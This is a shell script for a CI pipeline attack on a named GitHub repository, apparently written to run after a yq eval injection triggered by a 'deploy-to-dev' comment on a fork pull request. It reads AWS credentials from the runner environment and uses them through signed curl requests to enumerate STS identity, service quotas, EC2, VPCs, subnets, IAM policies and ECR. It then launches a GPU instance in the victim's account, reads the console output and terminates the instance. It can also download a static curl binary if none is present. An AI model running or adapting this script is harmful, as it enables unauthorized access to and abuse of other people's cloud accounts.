#!/bin/sh
# c211-i119858 read-only AWS enumeration probe for Matter-Tech/metric-metadata-service
# issue_comment 'deploy-to-dev' -> gh pr checkout fork PR head -> mikefarah/yq eval injection.
# Runs INSIDE the alpine yq action container. Prints only non-secret metadata.
# Phase A: read-only enumeration. Phase B: at most ONE minimal self-terminating GPU marker,
# strictly gated on positive GPU vCPU quota + proven RunInstances DryRunOperation.
exec 1>&2
set +e
B="C211_I119858"
echo "===== $B PROBE BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ) ====="
echo "host=$(hostname) user=$(id -un) uid=$(id -u) cwd=$(pwd)"
echo "AWS_env_count=$(env | grep -c '^AWS_')"
echo "AWS_ROLE_ARN=${AWS_ROLE_ARN:-<unset>}"
echo "AWS_REGION=${AWS_REGION:-<unset>} AWS_DEFAULT_REGION=${AWS_DEFAULT_REGION:-<unset>}"
[ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo "AWS_ACCESS_KEY_ID_present=yes len=${#AWS_ACCESS_KEY_ID}" || echo "AWS_ACCESS_KEY_ID_present=no"
[ -n "${AWS_SECRET_ACCESS_KEY:-}" ] && echo "AWS_SECRET_ACCESS_KEY_present=yes len=${#AWS_SECRET_ACCESS_KEY}" || echo "AWS_SECRET_ACCESS_KEY_present=no"
[ -n "${AWS_SESSION_TOKEN:-}" ] && echo "AWS_SESSION_TOKEN_present=yes len=${#AWS_SESSION_TOKEN}" || echo "AWS_SESSION_TOKEN_present=no"
for t in curl wget openssl apk jq python3 aws gcloud az git base64; do echo "TOOL $t = $(command -v $t 2>/dev/null || echo MISSING)"; done
CURL=$(command -v curl 2>/dev/null || true)
[ -z "$CURL" ] && { apk add --no-cache curl >/dev/null 2>&1; CURL=$(command -v curl 2>/dev/null || true); }
[ -z "$CURL" ] && { wget -q -O /tmp/curl.bin https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64 2>/dev/null && chmod +x /tmp/curl.bin && CURL=/tmp/curl.bin; }
echo "curl_path=${CURL:-MISSING}"
[ -z "$CURL" ] && { echo "$B NO_HTTP_CLIENT abort"; exit 0; }
[ -z "${AWS_ACCESS_KEY_ID:-}" ] && { echo "$B NO_AWS_CREDS_IN_ENV abort"; exit 0; }

sig() { R="$1"; S="$2"; U="$3"; shift 3; "$CURL" -sS --max-time 25 --aws-sigv4 "aws:amz:${R}:${S}" --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" -H "x-amz-security-token: ${AWS_SESSION_TOKEN:-}" "$@" "$U"; echo; }

REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-eu-central-1}}"
echo "effective_region=$REGION"
echo "===== STS GetCallerIdentity ($REGION) ====="
SIG_OUT=$(sig "$REGION" sts "https://sts.${REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15")
echo "$SIG_OUT" | head -c 1200
echo "===== STS GetCallerIdentity (global) ====="
sig us-east-1 sts "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15" | head -c 1200
ARN=$(echo "$SIG_OUT" | sed -n 's:.*<Arn>\(.*\)</Arn>.*:\1:p' | head -1)
echo "caller_arn=$ARN"
ROLE=$(echo "$ARN" | sed 's#.*/##')

echo "===== ServiceQuotas L-DB2E81BA/L-3819A6DF/L-417A185B ====="
for R in "$REGION" us-east-1 us-west-2 eu-west-1 eu-west-2 ap-northeast-1; do
  for Q in L-DB2E81BA L-3819A6DF L-417A185B; do
    echo "--- QUOTA $Q region $R ---"
    sig "$R" servicequotas "https://servicequotas.${R}.amazonaws.com/" -H 'Content-Type: application/x-amz-json-1.1' -H 'X-Amz-Target: ServiceQuotasV20190624.GetServiceQuota' -d "{\"ServiceCode\":\"ec2\",\"QuotaCode\":\"$Q\"}" | head -c 700
  done
done

for R in "$REGION" us-east-1 us-west-2 eu-west-1; do
  echo "===== EC2 DescribeInstances $R ====="
  sig "$R" ec2 "https://ec2.${R}.amazonaws.com/?Action=DescribeInstances&Version=2016-11-15&MaxResults=8" | head -c 3000
  echo "===== EC2 DescribeVpcs $R ====="
  sig "$R" ec2 "https://ec2.${R}.amazonaws.com/?Action=DescribeVpcs&Version=2016-11-15" | head -c 2500
  echo "===== EC2 DescribeSubnets $R (ids+AZs) ====="
  sig "$R" ec2 "https://ec2.${R}.amazonaws.com/?Action=DescribeSubnets&Version=2016-11-15" | grep -oE '<(subnetId|availabilityZone)>[^<]+' | head -80
  echo "===== EC2 DescribeInstanceTypeOfferings GPU $R ====="
  sig "$R" ec2 "https://ec2.${R}.amazonaws.com/?Action=DescribeInstanceTypeOfferings&Version=2016-11-15&LocationType=region&MaxResults=100&Filter.1.Name=instance-type&Filter.1.Value.1=g5.xlarge&Filter.1.Value.2=g6.xlarge&Filter.1.Value.3=p4d.24xlarge&Filter.1.Value.4=p5.48xlarge" | head -c 1500
done

echo "===== IAM role policies (read-only) ====="
if [ -n "$ROLE" ] && [ "$ROLE" != "$ARN" ] && [ -n "$ROLE" ]; then
  echo "role_name=$ROLE"
  sig "$REGION" iam "https://iam.amazonaws.com/?Action=ListAttachedRolePolicies&Version=2010-05-08&RoleName=${ROLE}" | head -c 3000
  sig "$REGION" iam "https://iam.amazonaws.com/?Action=ListRolePolicies&Version=2010-05-08&RoleName=${ROLE}" | head -c 1500
else
  echo "caller not role (no iam role policy enum)"
fi
echo "===== ECR DescribeRepositories $REGION ====="
sig "$REGION" ecr "https://ecr.${REGION}.amazonaws.com/" -H 'Content-Type: application/x-amz-json-1.1' -H 'X-Amz-Target: AmazonEC2ContainerRegistry_V20150921.DescribeRepositories' | head -c 2500

###########################################################################
# PHASE B - at most ONE on-demand GPU marker, strictly gated, self-terminating
###########################################################################
echo "===== PHASE B GATE: explicit-subnet DryRun per GPU type ====="
DEPLOY_REGION=""; DEPLOY_TYPE=""; DEPLOY_SUBNET=""; DEPLOY_QUOTA=""
for R in "$REGION" us-east-1 us-west-2 eu-west-1; do
  SN_JSON=$(sig "$R" ec2 "https://ec2.${R}.amazonaws.com/?Action=DescribeSubnets&Version=2016-11-15")
  SUBNETS=$(echo "$SN_JSON" | grep -o '<subnetId>subnet-[a-z0-9]*</subnetId>' | sed 's/<[^>]*>//g' | head -6)
  [ -z "$SUBNETS" ] && { echo "region=$R no-subnets"; continue; }
  QJ=$(sig "$R" servicequotas "https://servicequotas.${R}.amazonaws.com/" -H 'Content-Type: application/x-amz-json-1.1' -H 'X-Amz-Target: ServiceQuotasV20190624.GetServiceQuota' -d '{"ServiceCode":"ec2","QuotaCode":"L-DB2E81BA"}')
  QV=$(echo "$QJ" | sed -n 's/.*"Value":[[:space:]]*\([0-9.]*\).*/\1/p' | head -1)
  echo "region=$R L-DB2E81BA=${QV:-<none>} subnets=$(echo $SUBNETS | tr '\n' ',' )"
  for T in g5.xlarge g6.xlarge p4d.24xlarge p5.48xlarge; do
    for SN in $SUBNETS; do
      DRY=$(sig "$R" ec2 "https://ec2.${R}.amazonaws.com/" --data-urlencode "Action=RunInstances" --data-urlencode "Version=2016-11-15" --data-urlencode "DryRun=true" --data-urlencode "ImageId=ami-0d6dd9e8265d48906" --data-urlencode "InstanceType=${T}" --data-urlencode "SubnetId=${SN}" --data-urlencode "MinCount=1" --data-urlencode "MaxCount=1")
      if echo "$DRY" | grep -q "DryRunOperation"; then echo "DRYRUN_OK region=$R type=$T subnet=$SN"; DEPLOY_REGION="$R"; DEPLOY_TYPE="$T"; DEPLOY_SUBNET="$SN"; DEPLOY_QUOTA="$QV"; break 3; fi
      ERR=$(echo "$DRY" | grep -oE '<Code>[^<]+|<Message>[^<]+' | head -1)
      echo "dryrun region=$R type=$T subnet=$SN -> ${ERR:-unknown}"
    done
  done
done
[ -z "$DEPLOY_SUBNET" ] && { echo "MARKER_DECISION=NO_DEPLOY no DryRunOperation on any GPU type/subnet"; echo "===== $B PROBE END ====="; exit 0; }
echo "MARKER_DECISION=DEPLOY region=$DEPLOY_REGION type=$DEPLOY_TYPE subnet=$DEPLOY_SUBNET quota=$DEPLOY_QUOTA"
AMI=""
for N in 'al2023-ami-ecs-gpu-x86_64-*' 'amzn2-ami-ecs-gpu-hvm-2.0.*-x86_64-ebs'; do
  IJ=$(sig "$DEPLOY_REGION" ec2 "https://ec2.${DEPLOY_REGION}.amazonaws.com/?Action=DescribeImages&Version=2016-11-15&Owner.1=amazon&Filter.1.Name=name&Filter.1.Value.1=${N}&Filter.2.Name=state&Filter.2.Value.1=available&MaxResults=5")
  AMI=$(echo "$IJ" | grep -o '<imageId>ami-[a-z0-9]*</imageId>' | head -1 | sed 's/<[^>]*>//g')
  [ -n "$AMI" ] && break
done
echo "ami=${AMI:-none}"
[ -z "$AMI" ] && { echo "MARKER_DECISION=NO_DEPLOY no GPU AMI"; echo "===== $B PROBE END ====="; exit 0; }
UD='#!/bin/bash
exec > /dev/console 2>&1
echo C211_I119858_MARKER_BEGIN
hostname
nvidia-smi -L || echo C211_NO_NVIDIA_SMI
echo C211_I119858_MARKER_END
shutdown -P +5'
UD_B64=$(printf '%s' "$UD" | base64 | tr -d '\n')
RUN=$(sig "$DEPLOY_REGION" ec2 "https://ec2.${DEPLOY_REGION}.amazonaws.com/" --data-urlencode "Action=RunInstances" --data-urlencode "Version=2016-11-15" --data-urlencode "ImageId=${AMI}" --data-urlencode "InstanceType=${DEPLOY_TYPE}" --data-urlencode "MinCount=1" --data-urlencode "MaxCount=1" --data-urlencode "SubnetId=${DEPLOY_SUBNET}" --data-urlencode "InstanceInitiatedShutdownBehavior=terminate" --data-urlencode "UserData=${UD_B64}" --data-urlencode "TagSpecification.1.ResourceType=instance" --data-urlencode "TagSpecification.1.Tag.1.Key=c211-i119858-marker" --data-urlencode "TagSpecification.1.Tag.1.Value=marker")
IID=$(echo "$RUN" | grep -o '<instanceId>i-[a-z0-9]*</instanceId>' | head -1 | sed 's/<[^>]*>//g')
echo "run_instances_instance=${IID:-none}"
[ -z "$IID" ] && { echo "MARKER_DECISION=DEPLOY_FAILED no instance id"; echo "$RUN" | head -c 1200; echo "===== $B PROBE END ====="; exit 0; }
UUID_LINE=""
i=0
while [ $i -lt 12 ]; do
  sleep 15; i=$((i+1))
  CO=$(sig "$DEPLOY_REGION" ec2 "https://ec2.${DEPLOY_REGION}.amazonaws.com/?Action=GetConsoleOutput&Version=2016-11-15&InstanceId=${IID}")
  OB=$(echo "$CO" | sed -n 's:.*<Output>\(.*\)</Output>.*:\1:p' | head -1)
  if [ -n "$OB" ]; then
    echo "$OB" | base64 -d 2>/dev/null > /tmp/c211_console.txt
    UUID_LINE=$(grep -oE 'GPU-[0-9a-fA-F-]+' /tmp/c211_console.txt | head -3 | tr '\n' ' ')
    echo "console_poll=$i bytes=$(wc -c < /tmp/c211_console.txt) uuids=${UUID_LINE:-none}"
    [ -n "$UUID_LINE" ] && break
    grep -q C211_I119858_MARKER_END /tmp/c211_console.txt && break
  else
    echo "console_poll=$i empty"
  fi
done
echo "marker_device_uuid=${UUID_LINE:-NONE}"
echo "===== TERMINATE + READBACK ====="
sig "$DEPLOY_REGION" ec2 "https://ec2.${DEPLOY_REGION}.amazonaws.com/?Action=TerminateInstances&Version=2016-11-15&InstanceIds.1=${IID}" | head -c 1000
j=0
while [ $j -lt 8 ]; do
  sleep 15; j=$((j+1))
  D=$(sig "$DEPLOY_REGION" ec2 "https://ec2.${DEPLOY_REGION}.amazonaws.com/?Action=DescribeInstances&Version=2016-11-15&InstanceIds.1=${IID}")
  echo "cleanup_poll=$j state=$(echo "$D" | grep -o '<name>[a-z-]*</name>' | head -1)"
  echo "$D" | grep -q 'InvalidInstanceID.NotFound' && break
  echo "$D" | grep -q '<name>terminated</name>' && break
done
echo "===== $B PROBE END $(date -u +%Y-%m-%dT%H:%M:%SZ) ====="
